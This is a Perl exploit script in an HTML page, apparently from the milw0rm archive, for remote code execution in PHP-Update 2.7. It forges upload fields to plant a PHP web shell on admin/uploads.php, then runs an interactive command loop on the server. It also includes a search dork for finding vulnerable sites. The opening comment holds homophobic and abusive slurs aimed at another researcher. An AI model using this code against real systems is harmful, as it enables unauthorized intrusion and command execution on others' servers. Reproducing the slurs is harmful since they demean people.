<html><head><title>PHP-Update <= 2.7 (admin/uploads.php) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl

# rgod u fucking little piece of shit faggot. way to ruin a private exploit, scumbag

use strict;
use IO::Socket;
use MIME::Base64;
use Getopt::Std;


my $app = &quot;PHP-Update 2.7&quot;;
my $type = &quot;Remote Code Execution&quot;;
my $author = &quot;undefined1_&quot;;
my $date = &quot;2006-10-21&quot;;
my $settings = &quot;none&quot;;
my $dork = &quot;+\&quot;powered by php update\&quot;&quot;;

my %opt;
getopts(&quot;t:&quot;, \%opt);
$| = 1;
print &quot;:: $app $type - by $author ::\n\n\n&quot;;

our $url = $opt{t} || usage();
our $file = randstring(12,16).&quot;.php&quot;;

if($url =~ m/^(?:http:\/\/)(.*)/) {
	$url = $1;
}
if($url !~ m/^.*\/$/) {
	$url .= &quot;/&quot;;
}

get_shell($url);



sub get_shell {
	my $url = shift;
	
	print &quot;uploading shell ... \t&quot;;
	my $code = '&lt;?php ini_set(&quot;max_execution_time&quot;, 0); echo &quot;++f1++&quot;;';
	$code .= 'if(isset($_POST[&quot;c&quot;])) { $cmd = base64_decode($_POST[&quot;c&quot;]); $res = `$cmd`; echo base64_encode($res); } ';
	$code .= 'if(isset($_POST[&quot;d&quot;])) { if (@ini_get(&quot;safe_mode&quot;) || strtolower(@ini_get(&quot;safe_mode&quot;)) == &quot;on&quot;) {echo &quot;1&quot;;} else {echo &quot;0&quot;;} ';
	$code .= '$ds = @ini_get(&quot;disable_functions&quot;); if(!empty($ds)) { $ds = str_replace(&quot; &quot;,&quot;&quot;,$ds); $ds = explode(&quot;,&quot;,$ds); ';
	$code .= 'if(in_array(&quot;system&quot;, $ds)) { echo &quot;1&quot;; } else { echo &quot;0&quot;; } } else { echo &quot;0&quot;; } } ';
	$code .= 'if(isset($_POST[&quot;del&quot;])) { chmod(&quot;'.$file.'&quot;, 0777); unlink(&quot;'.$file.'&quot;); } echo &quot;++f2++&quot;; ?&gt;';
	
	my $boundary = &quot;---------------------------320726961453584717558222351&quot;;	
	my $content  = &quot;--$boundary\r\n&quot;;
	$content .= &quot;Content-Disposition: form-data; name=\&quot;logincookie[user]\&quot;\r\n\r\n&quot;;
	$content .= &quot;\r\n&quot;;
	$content .= &quot;--$boundary\r\n&quot;;
	$content .= &quot;Content-Disposition: form-data; name=\&quot;filecat\&quot;\r\n\r\n&quot;;
	$content .= &quot;gfx\r\n&quot;;
	$content .= &quot;--$boundary\r\n&quot;;
	$content .= &quot;Content-Disposition: form-data; name=\&quot;rights[7]\&quot;\r\n\r\n&quot;;
	$content .= &quot;1\r\n&quot;;
	$content .= &quot;--$boundary\r\n&quot;;
	$content .= &quot;Content-Disposition: form-data; name=\&quot;action\&quot;\r\n\r\n&quot;;
	$content .= &quot;login\r\n&quot;;
	$content .= &quot;--$boundary\r\n&quot;;
	$content .= &quot;Content-Disposition: form-data; name=\&quot;userfile\&quot;; filename=\&quot;$file\&quot;\r\n&quot;;
	$content .= &quot;Content-Type: text/plain\r\n\r\n&quot;.$code.&quot;\r\n&quot;;
	$content .= &quot;--$boundary--\r\n&quot;;
	my $data = &quot;POST &quot; . parse_page($url . &quot;admin/uploads.php&quot;) . &quot; HTTP/1.1\r\n&quot;;
	$data .= &quot;Host: &quot; . parse_host($url) . &quot;\r\n&quot;;
	$data .= &quot;Connection: close\r\n&quot;;
	$data .= &quot;Content-Type: multipart/form-data; boundary=$boundary\r\n&quot;;
	$data .= &quot;Content-Length: &quot; . length($content) . &quot;\r\n\r\n&quot;;
	my $recv = sendpacket(parse_host($url), parse_port($url), $data.$content);

	$content = &quot;d=1&quot;;
	$data = &quot;POST &quot; . parse_page($url . &quot;gfx/$file&quot;) . &quot; HTTP/1.1\r\n&quot;;
	$data .= &quot;Host: &quot; . parse_host($url) . &quot;\r\n&quot;;
	$data .= &quot;Connection: close\r\n&quot;;
	$data .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$data .= &quot;Content-Length: &quot; . length($content) . &quot;\r\n\r\n&quot;;
	$recv = sendpacket(parse_host($url), parse_port($url), $data.$content);
		
	if($recv !~ m/200 OK/m) {
		print &quot;failed\n&quot;;
		return;
	}		
		
	my $index1 = index($recv, &quot;++f1++&quot;) + 6;
	my $index2 = index($recv, &quot;++f2++&quot;, $index1);
	if($index1 &lt; 0 || $index2 &lt; 0) {
		print &quot;failed\n&quot;;
		return;
	}
	print &quot;OK\n&quot;;
	print &quot;shell @ gfx/$file\n&quot;;
	
	$recv = substr($recv, $index1, $index2-$index1);
	my $clean = 0;

	if(substr($recv,0,1) == &quot;1&quot;) {
		print &quot;safe mod on, exiting\n&quot;;
		clean();
	}
	else {
		print &quot;safe mod off\n&quot;;
	}
	if(substr($recv,1,1) == &quot;1&quot;) {
		print &quot;system() disabled, exiting\n&quot;;
		clean();
	}
	else {
		print &quot;system() enabled\n&quot;;
	}

	$SIG{INT} = \&amp;clean;
	$SIG{KILL} = \&amp;clean;
	$SIG{QUIT} = \&amp;clean;
	$SIG{SEGV} = \&amp;clean;
	while(1) 
	{
		print &quot;shell\$ &quot;;
		my $command;
		while(&lt;STDIN&gt;) 
		{
			$command=$_;
			chomp($command);
			last;
		}
		if($command eq &quot;exit&quot;)
		{
			clean();
		}

		$content = &quot;c=&quot;.encode_base64($command);
		$data = &quot;POST &quot; . parse_page($url . &quot;gfx/$file&quot;) . &quot; HTTP/1.1\r\n&quot;;
		$data .= &quot;Host: &quot; . parse_host($url) . &quot;\r\n&quot;;
		$data .= &quot;Connection: close\r\n&quot;;
		$data .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
		$data .= &quot;Content-Length: &quot; . length($content) . &quot;\r\n\r\n&quot;;
		$recv = sendpacket(parse_host($url), parse_port($url), $data . $content);
		
		$index1 = index($recv, &quot;++f1++&quot;) + 6;
		$index2 = index($recv, &quot;++f2++&quot;, $index1);
		if($index1 &gt;= 0 || $index2 &gt;= 0) {
			my $resp = decode_base64(substr($recv, $index1, $index2-$index1));
			chomp($resp);
			print &quot;$resp\n&quot;;
		}		
	}	
}

sub clean {
	my $content = &quot;del=1&quot;;
	my $data = &quot;POST &quot; . parse_page($url . &quot;gfx/$file&quot;) . &quot; HTTP/1.1\r\n&quot;;
	$data .= &quot;Host: &quot; . parse_host($url) . &quot;\r\n&quot;;
	$data .= &quot;Connection: close\r\n&quot;;
	$data .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$data .= &quot;Content-Length: &quot; . length($content) . &quot;\r\n\r\n&quot;;
	sendpacket(parse_host($url), parse_port($url), $data.$content);
	exit;
}


# ======================================================

sub parse_host {
	my $url = shift;
	if($url =~ m/^([^\/:]+).*\//) {
		return $1;
	}
	return &quot;127.0.0.1&quot;;
}

sub parse_port {
	my $url = shift;
	if($url =~ m/^(?:[^\/:]+):(\d+)\//) {
		return $1;
	}
	return &quot;80&quot;;
}

sub parse_page {
	my $url = shift;
	if($url =~ m/^(?:[^\/]+)(\/.*)/) {
		return $1;
	}
	return &quot;/&quot;;
}

sub randstring(\$,\$) {
	my $min = shift;
	my $max = shift;

	my $length = int( (rand(65535)%($max-$min+1))+$min);
	my $ret = &quot;&quot;;
	for(my $i = 0; $i &lt; $length; $i++)
	{
		my $w = int(rand(3));
		if($w == 0)
		{
			$ret .= chr(97 + int(rand(26)));
		}
		elsif($w == 1)
		{
			$ret .= chr(65 + int(rand(26)));
		}
		else
		{
			$ret .= chr(48 + int(rand(10)));
		}
	}
	return $ret;
}

sub sendpacket {
	my $server = shift;
	my $port = shift;
	my $data = shift;

	my $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $server, PeerPort =&gt; $port) or die &quot;:: Could not connect to $server:80 $!\n&quot;;
	print $sock &quot;$data&quot;;
	
	$data = &quot;&quot;;
	my $resp;
	while($resp = &lt;$sock&gt;)	{ $data .= $resp; }
	
	close($sock);
	return $data;
}

sub usage() {
	printf &quot;usage: %s -t&lt;url&gt;\n&quot;, $0;
	exit;
}

# milw0rm.com [2006-12-26]</pre></html>